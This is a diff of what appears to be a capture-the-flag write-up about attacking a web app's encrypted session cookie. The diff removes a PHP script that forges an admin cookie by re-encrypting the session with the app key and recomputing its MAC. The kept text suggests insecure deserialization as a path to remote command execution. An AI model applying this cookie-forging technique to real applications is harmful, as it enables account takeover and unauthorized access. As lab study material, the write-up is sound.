@@ -285,39 +285,9 @@ Re-running the script now results in this:
 
 This mysterious cookie seems to contain information about the user and the session.
 
-Let's try to change the username field to "admin", re-serialize the JSON, and send a forged cookie to the website. To do this the mac needs to be re-calculated so let's use a new script for that.
+The data is serialized, which means that there is a chance that the deserialization is done insecurely.
 
-```php
-#!/usr/bin/env php
-<?php
-
-$key = base64_decode("<APP_KEY>");
-$value = '{"data":"a:6:{s:6:\\"_token\\";s:40:\\"NW5QgjqxwZXo0Hm2XxtUlinBz69aOW79bLMkX3Ya\\";s:8:\\"username\\";s:5:\\"admin\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:26:\\"http:\\/\\/46.101.23.188:31323\\";}}","expires":1627565229}';
-
-$cipher = 'AES-256-CBC';
-
-$iv = random_bytes(openssl_cipher_iv_length($cipher));
-
-$value = openssl_encrypt(base64_decode($value), $cipher, base64_decode($key), 0, $iv);
-
-$iv = base64_encode($iv);
-$mac = hash_hmac('sha256', $iv.$value, base64_decode($key));
-
-$json = json_encode(compact('iv', 'value', 'mac'));
-
-$encodedPayload = base64_encode($json);
-echo $encodedPayload . PHP_EOL;
-```
-
-Running the script returns the forged cookie:
-
-![Forged cookie](./attachments/forged_cookie.png)
-
-Let's replace the mysterious cookie with this forged cookie and refresh the page.
-
-Nothing happened...
-
-Well since the data is serialized, there is a chance that the deserialization is done insecurely. If so, there might be a possibility to achieve remote command execution through it.
+If so, there might be a possibility to achieve remote command execution through it.
 
 <br />
 
